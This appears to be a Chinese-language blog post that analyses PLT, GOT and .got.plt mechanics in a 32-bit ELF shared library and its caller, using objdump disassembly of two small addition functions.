<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">addtwo</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  sum = x + y;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">addthree</span><span class="params">(<span class="type">int</span> x,<span class="type">int</span> y,<span class="type">int</span> z)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">  sum = addtwo(x,y)+z;</span><br><span class="line">  <span class="keyword">return</span> sum;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="makefile"><a href="#makefile" class="headerlink" title="makefile"></a>makefile</h3><p>一份”能用”的makefile,主要是用于记录编译参数. 方便重复输入：</p>
<figure class="highlight text"><table><tr><td class="code"><pre><span class="line">so:</span><br><span class="line">	gcc -m32 -g -Wl,-soname,add.so -shared -fPIC -o add.so add.c</span><br><span class="line">main:</span><br><span class="line">	gcc -m32 -g -Wl,-rpath,./ -o main.out main.c add.so</span><br></pre></td></tr></table></figure>
<h2 id="编译结果分析"><a href="#编译结果分析" class="headerlink" title="编译结果分析"></a>编译结果分析</h2><ul>
<li>我们着重对相关的<code>.dynamic</code>和相关的符号(<code>symbol</code>)和重定位表<code>rel.dyn</code>等进行详细分析。</li>
</ul>
<h3 id="分析-add-so"><a href="#分析-add-so" class="headerlink" title="分析: add.so"></a>分析: <code>add.so</code></h3><ul>
<li>命令: <code>objdump -d add.so</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"> .add.so:     file format elf32-i386</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Disassembly of section .init:</span><br><span class="line"></span><br><span class="line">000002dc &lt;_init&gt;:</span><br><span class="line"> 2dc:	55                   	push   %ebp</span><br><span class="line"> 2dd:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 2df:	53                   	push   %ebx</span><br><span class="line"> 2e0:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 2e3:	e8 00 00 00 00       	call   2e8 &lt;_init+0xc&gt;</span><br><span class="line"> 2e8:	5b                   	pop    %ebx</span><br><span class="line"> 2e9:	81 c3 cc 12 00 00    	add    $0x12cc,%ebx</span><br><span class="line"> 2ef:	8b 93 f4 ff ff     ff    	mov    -0xc(%ebx),%edx</span><br><span class="line"> 2f5:	85 d2                	test   %edx,%edx</span><br><span class="line"> 2f7:	74 05                	je     2fe &lt;_init+0x22&gt;</span><br><span class="line"> 2f9:	e8 1e 00 00 00       	call   31c &lt;__gmon_start__@plt&gt;</span><br><span class="line"> 2fe:	e8 cd 00 00 00       	call   3d0 &lt;frame_dummy&gt;</span><br><span class="line"> 303:	e8 68 01 00 00       	call   470 &lt;__do_global_ctors_aux&gt;</span><br><span class="line"> 308:	58                   	pop    %eax</span><br><span class="line"> 309:	5b                   	pop    %ebx</span><br><span class="line"> 30a:	c9                   	leave</span><br><span class="line"> 30b:	c3                   	ret</span><br><span class="line"></span><br><span class="line">; =====================================================</span><br><span class="line">; add.so 动态链接库的 .plt 段                        .</span><br><span class="line">; =====================================================</span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">0000030c &lt;__gmon_start__@plt-0x10&gt;:</span><br><span class="line"> 30c:	ff b3 04 00 00 00    	pushl  0x4(%ebx)</span><br><span class="line"> 312:	ff a3 08 00 00 00    	jmp    *0x8(%ebx)</span><br><span class="line"> 318:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">0000031c &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 31c:	ff a3 0c 00 00 00    	jmp    *0xc(%ebx)</span><br><span class="line"> 322:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 327:	e9 e0 ff ff ff       	jmp    30c &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">0000032c &lt;addtwo@plt&gt;:</span><br><span class="line"> 32c:	ff a3 10 00 00 00    	jmp    *0x10(%ebx)</span><br><span class="line"> 332:	68 08 00 00 00       	push   $0x8</span><br><span class="line"> 337:	e9 d0 ff ff ff       	jmp    30c &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">0000033c &lt;__cxa_finalize@plt&gt;:</span><br><span class="line"> 33c:	ff a3 14 00 00 00    	jmp    *0x14(%ebx)</span><br><span class="line"> 342:	68 10 00 00 00       	push   $0x10</span><br><span class="line"> 347:	e9 c0 ff ff ff       	jmp    30c &lt;_init+0x30&gt;</span><br><span class="line"></span><br><span class="line">Disassembly of section .text:</span><br><span class="line"></span><br><span class="line">00000350 &lt;__do_global_dtors_aux&gt;:</span><br><span class="line"> 350:	55                   	push   %ebp</span><br><span class="line"> 351:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 353:	56                   	push   %esi</span><br><span class="line"> 354:	53                   	push   %ebx</span><br><span class="line"> 355:	e8 ad 00 00 00       	call   407 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 35a:	81 c3 5a 12 00 00    	add    $0x125a,%ebx</span><br><span class="line"> 360:	83 ec 10             	sub    $0x10,%esp</span><br><span class="line"> 363:	80 bb 18 00 00 00 00 	cmpb   $0x0,0x18(%ebx)</span><br><span class="line"> 36a:	75 5d                	jne    3c9 &lt;__do_global_dtors_aux+0x79&gt;</span><br><span class="line"> 36c:	8b 83 fc ff ff ff    	mov    -0x4(%ebx),%eax</span><br><span class="line"> 372:	85 c0                	test   %eax,%eax</span><br><span class="line"> 374:	74 0e                	je     384 &lt;__do_global_dtors_aux+0x34&gt;</span><br><span class="line"> 376:	8d 83 28 ff ff ff    	lea    -0xd8(%ebx),%eax</span><br><span class="line"> 37c:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 37f:	e8 b8 ff ff ff       	call   33c &lt;__cxa_finalize@plt&gt;</span><br><span class="line"> 384:	8b 83 1c 00 00 00    	mov    0x1c(%ebx),%eax</span><br><span class="line"> 38a:	8d b3 20 ff ff ff    	lea    -0xe0(%ebx),%esi</span><br><span class="line"> 390:	8d 93 1c ff ff ff    	lea    -0xe4(%ebx),%edx</span><br><span class="line"> 396:	29 d6                	sub    %edx,%esi</span><br><span class="line"> 398:	c1 fe 02             	sar    $0x2,%esi</span><br><span class="line"> 39b:	83 ee 01             	sub    $0x1,%esi</span><br><span class="line"> 39e:	39 f0                	cmp    %esi,%eax</span><br><span class="line"> 3a0:	73 20                	jae    3c2 &lt;__do_global_dtors_aux+0x72&gt;</span><br><span class="line"> 3a2:	8d b6 00 00 00 00    	lea    0x0(%esi),%esi</span><br><span class="line"> 3a8:	83 c0 01             	add    $0x1,%eax</span><br><span class="line"> 3ab:	89 83 1c 00 00 00    	mov    %eax,0x1c(%ebx)</span><br><span class="line"> 3b1:	ff 94 83 1c ff ff ff 	call   *-0xe4(%ebx,%eax,4)</span><br><span class="line"> 3b8:	8b 83 1c 00 00 00    	mov    0x1c(%ebx),%eax</span><br><span class="line"> 3be:	39 f0                	cmp    %esi,%eax</span><br><span class="line"> 3c0:	72 e6                	jb     3a8 &lt;__do_global_dtors_aux+0x58&gt;</span><br><span class="line"> 3c2:	c6 83 18 00 00 00 01 	movb   $0x1,0x18(%ebx)</span><br><span class="line"> 3c9:	83 c4 10             	add    $0x10,%esp</span><br><span class="line"> 3cc:	5b                   	pop    %ebx</span><br><span class="line"> 3cd:	5e                   	pop    %esi</span><br><span class="line"> 3ce:	5d                   	pop    %ebp</span><br><span class="line"> 3cf:	c3                   	ret</span><br><span class="line"></span><br><span class="line">000003d0 &lt;frame_dummy&gt;:</span><br><span class="line"> 3d0:	55                   	push   %ebp</span><br><span class="line"> 3d1:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 3d3:	53                   	push   %ebx</span><br><span class="line"> 3d4:	e8 2e 00 00 00       	call   407 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 3d9:	81 c3 db 11 00 00    	add    $0x11db,%ebx</span><br><span class="line"> 3df:	83 ec 14             	sub    $0x14,%esp</span><br><span class="line"> 3e2:	8b 93 24 ff ff ff    	mov    -0xdc(%ebx),%edx</span><br><span class="line"> 3e8:	85 d2                	test   %edx,%edx</span><br><span class="line"> 3ea:	74 15                	je     401 &lt;frame_dummy+0x31&gt;</span><br><span class="line"> 3ec:	8b 83 f8 ff ff ff    	mov    -0x8(%ebx),%eax</span><br><span class="line"> 3f2:	85 c0                	test   %eax,%eax</span><br><span class="line"> 3f4:	74 0b                	je     401 &lt;frame_dummy+0x31&gt;</span><br><span class="line"> 3f6:	8d 93 24 ff ff ff    	lea    -0xdc(%ebx),%edx</span><br><span class="line"> 3fc:	89 14 24             	mov    %edx,(%esp)</span><br><span class="line"> 3ff:	ff d0                	call   *%eax</span><br><span class="line"> 401:	83 c4 14             	add    $0x14,%esp</span><br><span class="line"> 404:	5b                   	pop    %ebx</span><br><span class="line"> 405:	5d                   	pop    %ebp</span><br><span class="line"> 406:	c3                   	ret</span><br><span class="line"></span><br><span class="line">00000407 &lt;__i686.get_pc_thunk.bx&gt;:</span><br><span class="line"> 407:	8b 1c 24             	mov    (%esp),%ebx</span><br><span class="line"> 40a:	c3                   	ret</span><br><span class="line"> 40b:	90                   	nop</span><br><span class="line"></span><br><span class="line">0000040c &lt;addtwo&gt;:</span><br><span class="line"> 40c:	55                   	push   %ebp</span><br><span class="line"> 40d:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 40f:	83 ec 10             	sub    $0x10,%esp</span><br><span class="line"> 412:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)</span><br><span class="line"> 419:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 41c:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 41f:	8d 04 02             	lea    (%edx,%eax,1),%eax</span><br><span class="line"> 422:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 425:	8b 45 fc             	mov    -0x4(%ebp),%eax</span><br><span class="line"> 428:	c9                   	leave</span><br><span class="line"> 429:	c3                   	ret</span><br><span class="line"></span><br><span class="line">0000042a &lt;addthree&gt;:</span><br><span class="line"> 42a:	55                   	push   %ebp</span><br><span class="line"> 42b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 42d:	53                   	push   %ebx</span><br><span class="line"> 42e:	83 ec 24             	sub    $0x24,%esp</span><br><span class="line"> 431:	e8 d1 ff ff ff       	call   407 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 436:	81 c3 7e 11 00 00    	add    $0x117e,%ebx</span><br><span class="line"> 43c:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)</span><br><span class="line"> 443:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 446:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 44a:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 44d:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 450:	e8 d7 fe ff ff       	call   32c &lt;addtwo@plt&gt;</span><br><span class="line"> 455:	03 45 10             	add    0x10(%ebp),%eax</span><br><span class="line"> 458:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 45b:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 45e:	83 c4 24             	add    $0x24,%esp</span><br><span class="line"> 461:	5b                   	pop    %ebx</span><br><span class="line"> 462:	5d                   	pop    %ebp</span><br><span class="line"> 463:	c3                   	ret</span><br><span class="line"> 464:	90                   	nop</span><br><span class="line"> 465:	90                   	nop</span><br><span class="line"> 466:	90                   	nop</span><br><span class="line"> 467:	90                   	nop</span><br><span class="line"> 468:	90                   	nop</span><br><span class="line"> 469:	90                   	nop</span><br><span class="line"> 46a:	90                   	nop</span><br><span class="line"> 46b:	90                   	nop</span><br><span class="line"> 46c:	90                   	nop</span><br><span class="line"> 46d:	90                   	nop</span><br><span class="line"> 46e:	90                   	nop</span><br><span class="line"> 46f:	90                   	nop</span><br><span class="line"></span><br><span class="line">00000470 &lt;__do_global_ctors_aux&gt;:</span><br><span class="line"> 470:	55                   	push   %ebp</span><br><span class="line"> 471:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 473:	56                   	push   %esi</span><br><span class="line"> 474:	53                   	push   %ebx</span><br><span class="line"> 475:	e8 8d ff ff ff       	call   407 &lt;__i686.get_pc_thunk.bx&gt;</span><br><span class="line"> 47a:	81 c3 3a 11 00 00    	add    $0x113a,%ebx</span><br><span class="line"> 480:	8b 83 14 ff ff ff    	mov    -0xec(%ebx),%eax</span><br><span class="line"> 486:	83 f8 ff             	cmp    $0xffffffff,%eax</span><br><span class="line"> 489:	74 19                	je     4a4 &lt;__do_global_ctors_aux+0x34&gt;</span><br><span class="line"> 48b:	8d b3 14 ff ff ff    	lea    -0xec(%ebx),%esi</span><br><span class="line"> 491:	8d b4 26 00 00 00 00 	lea    0x0(%esi,%eiz,1),%esi</span><br><span class="line"> 498:	83 ee 04             	sub    $0x4,%esi</span><br><span class="line"> 49b:	ff d0                	call   *%eax</span><br><span class="line"> 49d:	8b 06                	mov    (%esi),%eax</span><br><span class="line"> 49f:	83 f8 ff             	cmp    $0xffffffff,%eax</span><br><span class="line"> 4a2:	75 f4                	jne    498 &lt;__do_global_ctors_aux+0x28&gt;</span><br><span class="line"> 4a4:	5b                   	pop    %ebx</span><br><span class="line"> 4a5:	5e                   	pop    %esi</span><br><span class="line"> 4a6:	5d                   	pop    %ebp</span><br><span class="line"> 4a7:	c3                   	ret</span><br><span class="line"></span><br><span class="line">Disassembly of section .fini:</span><br><span class="line"></span><br><span class="line">000004a8 &lt;_fini&gt;:</span><br><span class="line"> 4a8:	55                   	push   %ebp</span><br><span class="line"> 4a9:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 4ab:	53                   	push   %ebx</span><br><span class="line"> 4ac:	83 ec 04             	sub    $0x4,%esp</span><br><span class="line"> 4af:	e8 00 00 00 00       	call   4b4 &lt;_fini+0xc&gt;</span><br><span class="line"> 4b4:	5b                   	pop    %ebx</span><br><span class="line"> 4b5:	81 c3 00 11 00 00    	add    $0x1100,%ebx</span><br><span class="line"> 4bb:	e8 90 fe ff ff       	call   350 &lt;__do_global_dtors_aux&gt;</span><br><span class="line"> 4c0:	59                   	pop    %ecx</span><br><span class="line"> 4c1:	5b                   	pop    %ebx</span><br><span class="line"> 4c2:	c9                   	leave</span><br><span class="line"> 4c3:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>我们看到如下的代码:</p>
<p><img src="/image/post/transship/0005/2.jpg" alt=".PLT项的内容分析"></p>
<center>.PLT项的内容分析</center>

<p>结论:</p>
<ul>
<li>PLT 实际为代码段. 不是简单的数据段. 首先其内容不会变. 且内容的确为一些JMP相关的代码。</li>
<li>PLT的第一项地址为: 0x0000030C (这个是基于VMA基地址为0的虚拟地址)</li>
<li>上面的ebx的值实际为<code>.got.plt</code>段的基地址.(后面会证明)</li>
<li>使用<code>.got.plt</code>表进行间接寻址时,是从第4项开始的,即前三项进行了跳过。</li>
<li><code>.got.plt</code> 表项的大小为 <code>4字节</code></li>
<li><code>addtwo</code> 作为一个内部和外部都会调用的函数.在PLT中有自己的<strong>表项</strong>。</li>
<li><strong>注意：</strong> 而同时也作为外部函数的addthree 并<strong>没有自己的PLT项</strong>。</li>
</ul>
<h3 id="验证-ebx的内容是-got-plt基地址"><a href="#验证-ebx的内容是-got-plt基地址" class="headerlink" title="验证 ebx的内容是.got.plt基地址"></a>验证 ebx的内容是<code>.got.plt</code>基地址</h3><p>我 们先看一下<code>.got</code>的段信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 命令: objdump -j .got -h add.so</span><br><span class="line">add.so:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"> 18 .got          0000000c  000015a8  000015a8  000005a8  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure>
<p>我们发现<code>.got</code>段的大小为<code>12</code>字节. 偏移地址为：<code>0x000015a8</code>，紧接着我们看一下<code>.got.plt</code>的信息。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 命令 objdump -j .got.plt  -h add.so</span><br><span class="line"></span><br><span class="line">add.so:     file format elf32-i386</span><br><span class="line"></span><br><span class="line">Sections:</span><br><span class="line">Idx Name          Size      VMA       LMA       File off  Algn</span><br><span class="line"> 19 .got.plt      00000018  000015b4  000015b4  000005b4  2**2</span><br><span class="line">                  CONTENTS, ALLOC, LOAD, DATA</span><br></pre></td></tr></table></figure>
<p><strong>重点：</strong> <code>.got.plt</code>的VMA是：<code>0x000015b4</code>；这个好像并不能说明什么。别急，我们看一下ebx的内容是怎么得到的，先看一下<code>addthree</code>中对<code>addtwo</code>的调用部分：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">0000040c &lt;addtwo&gt;:</span><br><span class="line"> 40c:	55                   	push   %ebp</span><br><span class="line"> 40d:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 40f:	83 ec 10             	sub    $0x10,%esp</span><br><span class="line"> 412:	c7 45 fc 00 00 00 00 	movl   $0x0,-0x4(%ebp)</span><br><span class="line"> 419:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 41c:	8b 55 08             	mov    0x8(%ebp),%edx</span><br><span class="line"> 41f:	8d 04 02             	lea    (%edx,%eax,1),%eax</span><br><span class="line"> 422:	89 45 fc             	mov    %eax,-0x4(%ebp)</span><br><span class="line"> 425:	8b 45 fc             	mov    -0x4(%ebp),%eax</span><br><span class="line"> 428:	c9                   	leave</span><br><span class="line"> 429:	c3                   	ret</span><br><span class="line"></span><br><span class="line">0000042a &lt;addthree&gt;:</span><br><span class="line"> 42a:	55                   	push   %ebp</span><br><span class="line"> 42b:	89 e5                	mov    %esp,%ebp</span><br><span class="line"> 42d:	53                   	push   %ebx</span><br><span class="line"> 42e:	83 ec 24             	sub    $0x24,%esp</span><br><span class="line">;====:</span><br><span class="line"> 431:	e8 d1 ff ff ff       	call   407 &lt;__i686.get_pc_thunk.bx&gt; ;</span><br><span class="line"> 436:	81 c3 7e 11 00 00    	add    $0x117e,%ebx</span><br><span class="line"> 43c:	c7 45 f4 00 00 00 00 	movl   $0x0,-0xc(%ebp)</span><br><span class="line"> 443:	8b 45 0c             	mov    0xc(%ebp),%eax</span><br><span class="line"> 446:	89 44 24 04          	mov    %eax,0x4(%esp)</span><br><span class="line"> 44a:	8b 45 08             	mov    0x8(%ebp),%eax</span><br><span class="line"> 44d:	89 04 24             	mov    %eax,(%esp)</span><br><span class="line"> 450:	e8 d7 fe ff ff       	call   32c &lt;addtwo@plt&gt;</span><br><span class="line"> 455:	03 45 10             	add    0x10(%ebp),%eax</span><br><span class="line"> 458:	89 45 f4             	mov    %eax,-0xc(%ebp)</span><br><span class="line"> 45b:	8b 45 f4             	mov    -0xc(%ebp),%eax</span><br><span class="line"> 45e:	83 c4 24             	add    $0x24,%esp</span><br><span class="line"> 461:	5b                   	pop    %ebx</span><br><span class="line"> 462:	5d                   	pop    %ebp</span><br><span class="line"> 463:	c3                   	ret</span><br></pre></td></tr></table></figure>
<p>我们对计算的部分进行一下标注：</p>
<p><img src="/image/post/transship/0005/3.jpg" alt=""></p>
<center>在call addtwo@plt之前.ebx的值已经计算好为: 0x15B4</center>

<ul>
<li>与预期一致，因为这个库里面的所有的代码都是需要重定位的，没有静态可以确定位置的。</li>
</ul>
<p>再看一下动态段的重定位表：</p>
<p><img src="/image/post/transship/0005/4.jpg" alt=""></p>
<center>另外一个引用PLT表的地方：EBX仍然值为0x15B4</center>

<p>因此我们可以确定，当所有的调用到<code>.plt</code>段的时候，ebx都会提前初始化为<code>.got.plt</code>的段基地址。而在上面的PLT的表项中的代码中，在引用EBX进行JMP的时候，还会跟上一个表内偏移。</p>
<ul>
<li>第一个PLT项是一个common的项。没有用于跳转找目标函数。</li>
<li>从第二个PLT项开始安排为跳转项。每一个PLT项的大小为：16字节。因为每个表项之间的偏移为16字节。</li>
<li>PLT引用的<code>.got.plt</code>段前三个entry都没有用到. 根据书中的内容我们可知：</li>
</ul>
<p><img src="/image/post/transship/0005/5.jpg" alt=""></p>
<center>.got.plt中的前三项内容</center>

<h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p>我们看一下重定位表的内容，按道理重定位表应该会对<code>.got</code>和<code>.got.plt</code>的内容进行重定位，因为动态链接库的装载地址是不确定的。因此<code>.got</code>项和<code>.got.plt</code>的内容都需要在装载时重定位。</p>
<p>先看一下非动态段的重定位表：</p>
<p><img src="/image/post/transship/0005/6.jpg" alt=""></p>
<center>没有需要重定位的的项</center>

<ul>
<li>与预期一致，因为这个库里面的所有的代码都是需要重定位的。没有静态可以确定位置的。</li>
</ul>
<p>再看一下动态段的重定位表：</p>
<p><img src="/image/post/transship/0005/7.jpg" alt=""></p>
<center>一样与预期一致</center>

<p>解读一下：</p>
<ul>
<li>同样没有函数: <code>addthree</code> 的符号的相关的重定位项. (并不代表<code>addthree</code>不需要重定位. 这是两个概念.)</li>
<li>里面有三个<code>R_386_JUMP_SLOT</code>类型的重定位项. 三个项的地址分别是:<ul>
<li>000015c0: <code>R_386_JUMP_SLOT</code></li>
<li>000015c4: <code>R_386_JUMP_SLOT</code></li>
<li>000015c8: <code>R_386_JUMP_SLOT</code></li>
</ul>
</li>
</ul>
<p>我们知道<code>.got.plt</code>的首地址是: <code>0x15B4</code>。而第一个<code>JUMP_SLOT</code>的地址是：<code>15B4+4*3</code> = <code>15C0</code> 和前面分析的跳过了前三项<code>got.plt</code>项保持一致。</p>
<h3 id="为什么没有addthree的plt项"><a href="#为什么没有addthree的plt项" class="headerlink" title="为什么没有addthree的plt项"></a>为什么没有<code>addthree</code>的<code>plt</code>项</h3><ul>
<li>这个问题其实非常重要。它将揭示<code>.plt</code>表项的本质。以及结合上面的PLT项是代码还是数据结合看就可以得出结论了。</li>
</ul>
<p>虽然我们的动态链接库同时导出了两个函数：<code>addtwo</code>和<code>addthree</code>；但是并不是两个函数都出现在了<code>.plt</code>中。而且只有一个被内部自己调用的<code>addtwo</code>函数有一个<code>.plt</code>表项. 这似乎隐约在说明一个问题：</p>
<ul>
<li><code>.plt</code>段是一个胶水代码段，他属于调用方，不属于被调用方。</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">上面猜测是属于调用方，那似乎应该大概在main函数的主模块里面会有对应的```.plt```段，并且有相应的```addtwo```函数和```addthree```函数的入口，我们先来看一下：</span><br><span class="line"></span><br><span class="line">### ```main```模块中的```got.plt```</span><br><span class="line"></span><br><span class="line">下面是主模块中的```.plt```段，果不其然，我们在其中发现了两个```.plt```项：</span><br><span class="line"></span><br><span class="line">* ```addtwo@plt``` : ```0x08048400```</span><br><span class="line">* ```addthree@plt``` ```0x08048410```</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">* 由于在主程序模块中，不需要动态重定位，因此这些代码加载到内存虚拟空间的地址是确定的。</span><br><span class="line"></span><br><span class="line">![](/image/post/transship/0005/8.jpg)</span><br><span class="line">&lt;center&gt;主程序模块中的.plt段&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">这样就可以进一步的确认：```.plt```模块是属于调用方，因为我们在调用方的代码中找到了两个动态模块中的函数的```.plt```入口，而在动态模块中并没有完整的两个入口。</span><br><span class="line"></span><br><span class="line">* 这其实与之前理解的plt可能属于数据段，然后由于延时加载的需要在```.got```的基础上，又加了一级```.plt```的**间接跳转**。这样这个```.plt```因为作用与```.got```类似。```.got```是一个全局偏移表，那似乎可以被所有的模块共用(现在还不能确定，后面会论证)。那```.plt```也一样，就像把一级指针的```.got```变成了两级指针的```.plt```加```.got```了。这个理解似乎没有什么问题，如果```.plt```是数据段的话。只是又加了一级对```.got```的间接寻址而已。如果```.plt```是全局共享的话，那其它模块在引用它的时候。需要：</span><br><span class="line">  - 要么绝对寻址地从一个地方call调用跳转到相应的```.plt```的地方。由于是绝对地址，而```.plt```有加载地址是不确定的。是动态的。那只有**加载时重定位**   的方式才能实现。那这个方式就决定了只有主模块在使用加载时重定位的方式进行修改地址。但是这个只能主模块适用。如果是其它的模块。比如另外的动态模块，那动态模块就必须得修改代码段才能正确引用到```.plt```的地址，这样就无法实现PIC的代码了，**因此结论不成立**。</span><br><span class="line">  - 如果是使用相对寻址。那就需要相对寻址的两者之间的地址不能变化。否则就不能相对寻址了。那这样其它模块与 这个动态模块的地址之间就产生了关联。违背了**动态模块地址无关性**的PIC模式。因此**结论也不成立**。</span><br><span class="line"></span><br><span class="line">这样：不管使用怎样的地址定位方式，其它模块都无法友好的使用当前动态模块的```.plt```入口，因此，```.plt```必不属于被调用方，它应该是调用方自己的一个附属的胶水代码。</span><br><span class="line"></span><br><span class="line">## ```.got.plt```段是否为进程全局唯一共享</span><br><span class="line"></span><br><span class="line">这样我们论证完```.plt```的归属后，接下来的问题就是确定```.got```段的唯一性与归属性的问题。</span><br><span class="line">* 先说一个引子：</span><br><span class="line">  - 问：我们最初成立```.got```段的目的是什么？</span><br><span class="line">  - 答：把代码中引用一个不确定的地址的情况下，需要重定位修改代码部分的重定位过程导致代码段不可变不成立的：地址引用，将其从代码中剥离出来。单独放到数据段。就像代码段中对一个变量的绝对地址引用，修改为从数据段的一个地址指针的间接引用，这样才能保证代码段的内容始终保持不变。然后数据段```.GOT```的内容动态的重定位到相应的目标符号。</span><br><span class="line"></span><br><span class="line">其实有了上面一段描述的推理后，那```.got```是否属于进程中所有共享对象统一使用。这个结论已经很明确了。那就是```.got```段是属于模块自身的一个数据段，而不是所有的模块共享，从上面的```.got```段会被一个代码段的地址相对地址引用，那就决定了```.got```必须与相对应的代码段保持稳定的相对距离，这样才能被代码用相对地址定位的方式进行访问到。而另外一方面，不同的代码段之间的相对位置又是不确定的。这就间接说明了，不同共享对象的之间的代码段的相对地址不确定，所以不同的代码段(不同的模块)之间使用的```.got```不是同一个表。虽然```.got```被称作```全局偏移表：global offset table```，但是他只属于模块本身。</span><br><span class="line"></span><br><span class="line">### main中的```.got.plt```地址：</span><br><span class="line"></span><br><span class="line">同样先看一下```.got```</span><br><span class="line"></span><br><span class="line">![](/image/post/transship/0005/9.jpg)</span><br><span class="line">&lt;center&gt;main模块中的.got段的信息&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">我们可以看到的确在main模块中有```.got```段且其虚拟地址在这里已经确定下来：```080497c4```，这个与动态模块中的```.got```段的虚拟地址不一样，其虚拟地址为：```000015a8```，这两个的地址完全不一样。</span><br><span class="line"></span><br><span class="line">再看一下我们的目标：```.got.plt```</span><br><span class="line"></span><br><span class="line">![](/image/post/transship/0005/10.jpg)</span><br><span class="line">&lt;center&gt;main模块中的.got.plt&lt;/center&gt;</span><br><span class="line"></span><br><span class="line">同样我们看一下main中对```.got.plt```的引用有一些不一样：</span><br><span class="line"></span><br><span class="line">```asm</span><br><span class="line">Disassembly of section .plt:</span><br><span class="line"></span><br><span class="line">080483d0 &lt;__gmon_start__@plt-0x10&gt;:</span><br><span class="line"> 80483d0:	ff 35 cc 97 04 08    	pushl  0x80497cc</span><br><span class="line"> 80483d6:	ff 25 d0 97 04 08    	jmp    *0x80497d0</span><br><span class="line"> 80483dc:	00 00                	add    %al,(%eax)</span><br><span class="line">	...</span><br><span class="line"></span><br><span class="line">080483e0 &lt;__gmon_start__@plt&gt;:</span><br><span class="line"> 80483e0:	ff 25 d4 97 04 08    	jmp    *0x80497d4</span><br><span class="line"> 80483e6:	68 00 00 00 00       	push   $0x0</span><br><span class="line"> 80483eb:	e9 e0 ff ff ff       	jmp    80483d0 &lt;_init+0x30&gt;</span><br></pre></td></tr></table></figure>
<p>我们发现：</p>
<ol>
<li>在main中对<code>.got.plt</code>的引用不再使用ebx寄存器进行基址相对寻址。</li>
<li>使用的第一个<code>.got.plt</code>项是<code>0x80497d4</code>。</li>
</ol>
<p>而我们上面说<code>.got.plt</code>的基地址是：<code>080497c8</code>，那前三项是被跳过了的即：<code>080497c8</code>,<code>080497cc</code>,<code>080497d0</code>，然后从<code>0x80497d4</code>开始，与前面所说的跳过前三项用于加载当前模块的动态依赖相关的信息有关系。</p>
<p>到此。所有的疑问都很清晰了，还有一点需要我们探究一下。那就是为什么main模块中对<code>.got.plt</code>引用不是使用的ebx进行寻址。而<code>add.so</code>中却是如此，其实啊，这个与两个模块的虚拟地址的确定与否有关系。</p>
<ul>
<li>主模块的加载虚拟地址是确定的。它是加载到进程中的第一个模块。他的地址在编译链接时就已经确认。在加载到内存的时候直接按照<code>program header</code>的信息加载到内存即可。因此：模块代码与got相关的位置是固定的，且是确定的。那在进行寻址的时候，直接使用一个固定的地址的间接引用即可。(即上面的:<code>jmp *0x80497d0</code>)</li>
<li>而动态模块在加载的时候其加载基地址是不确定的，因此需要使用ebx去动态的获取到当前代码加载的地址。这样才能够满足动态加载的需求。</li>
</ul>
